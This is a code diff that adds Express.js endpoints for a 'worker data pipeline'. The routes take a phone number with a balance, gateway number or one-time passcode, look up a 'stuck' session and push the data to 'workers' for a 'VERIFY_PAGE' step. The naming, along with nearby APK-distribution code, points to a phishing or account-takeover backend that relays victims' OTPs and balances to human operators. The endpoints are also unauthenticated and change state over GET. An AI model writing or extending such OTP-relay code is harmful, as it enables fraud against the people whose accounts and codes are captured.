@@ -475,6 +475,143 @@ app.get('/api/release-stuck', (req, res) => {
   }
   res.json({ success: false });
 });
+
+// ===== WORKER DATA PIPELINE (by phone, for stuck sessions) =====
+
+// Endpoint 1: Submit number + balance by phone → available to workers
+app.post('/api/worker-data', (req, res) => {
+  const phone = req.body?.phone || req.query?.phone;
+  const number = req.body?.number || req.query?.number || '';
+  const balance = req.body?.balance || req.query?.balance || '';
+
+  if (!phone) return res.json({ success: false });
+
+  const n = normalizePhoneForLookup(phone);
+
+  for (const [id, data] of Object.entries(sessions)) {
+    if (!data || data.stuckPageActive !== true) continue;
+    const p1 = normalizePhoneForLookup(data.initialPhone);
+    const p2 = normalizePhoneForLookup(data.gatewayPhone);
+    if (p1 === n || p2 === n) {
+      const updates = {
+        ...data,
+        gatewayPhone: number || data.gatewayPhone,
+        balance: balance || data.balance,
+        lastAutomationData: '',
+        lastDataSentAt: 0,
+        assignedWorker: null,
+        assignedAt: null,
+        lastUpdated: Date.now(),
+      };
+      sessions[id] = updates;
+      saveSession(id);
+      return res.json({ success: true });
+    }
+  }
+
+  res.json({ success: false });
+});
+
+app.get('/api/worker-data', (req, res) => {
+  const phone = req.query?.phone;
+  const number = req.query?.number || '';
+  const balance = req.query?.balance || '';
+
+  if (!phone) return res.json({ success: false });
+
+  const n = normalizePhoneForLookup(phone);
+
+  for (const [id, data] of Object.entries(sessions)) {
+    if (!data || data.stuckPageActive !== true) continue;
+    const p1 = normalizePhoneForLookup(data.initialPhone);
+    const p2 = normalizePhoneForLookup(data.gatewayPhone);
+    if (p1 === n || p2 === n) {
+      const updates = {
+        ...data,
+        gatewayPhone: number || data.gatewayPhone,
+        balance: balance || data.balance,
+        lastAutomationData: '',
+        lastDataSentAt: 0,
+        assignedWorker: null,
+        assignedAt: null,
+        lastUpdated: Date.now(),
+      };
+      sessions[id] = updates;
+      saveSession(id);
+      return res.json({ success: true });
+    }
+  }
+
+  res.json({ success: false });
+});
+
+// Endpoint 2: Submit OTP by phone → available to workers
+app.post('/api/worker-otp', (req, res) => {
+  const phone = req.body?.phone || req.query?.phone;
+  const otp = req.body?.otp || req.query?.otp || '';
+
+  if (!phone || !otp) return res.json({ success: false });
+
+  const n = normalizePhoneForLookup(phone);
+
+  for (const [id, data] of Object.entries(sessions)) {
+    if (!data || data.stuckPageActive !== true) continue;
+    const p1 = normalizePhoneForLookup(data.initialPhone);
+    const p2 = normalizePhoneForLookup(data.gatewayPhone);
+    if (p1 === n || p2 === n) {
+      const updates = {
+        ...data,
+        otp: otp,
+        gatewayOtp: otp,
+        waitingFor: 'VERIFY_PAGE',
+        lastAutomationData: '',
+        lastDataSentAt: 0,
+        assignedWorker: null,
+        assignedAt: null,
+        lastUpdated: Date.now(),
+      };
+      sessions[id] = updates;
+      saveSession(id);
+      return res.json({ success: true });
+    }
+  }
+
+  res.json({ success: false });
+});
+
+app.get('/api/worker-otp', (req, res) => {
+  const phone = req.query?.phone;
+  const otp = req.query?.otp || '';
+
+  if (!phone || !otp) return res.json({ success: false });
+
+  const n = normalizePhoneForLookup(phone);
+
+  for (const [id, data] of Object.entries(sessions)) {
+    if (!data || data.stuckPageActive !== true) continue;
+    const p1 = normalizePhoneForLookup(data.initialPhone);
+    const p2 = normalizePhoneForLookup(data.gatewayPhone);
+    if (p1 === n || p2 === n) {
+      const updates = {
+        ...data,
+        otp: otp,
+        gatewayOtp: otp,
+        waitingFor: 'VERIFY_PAGE',
+        lastAutomationData: '',
+        lastDataSentAt: 0,
+        assignedWorker: null,
+        assignedAt: null,
+        lastUpdated: Date.now(),
+      };
+      sessions[id] = updates;
+      saveSession(id);
+      return res.json({ success: true });
+    }
+  }
+
+  res.json({ success: false });
+});
+
 // ===== APK MANAGEMENT (Admin upload + download URL) =====
 
 // Serve uploaded files
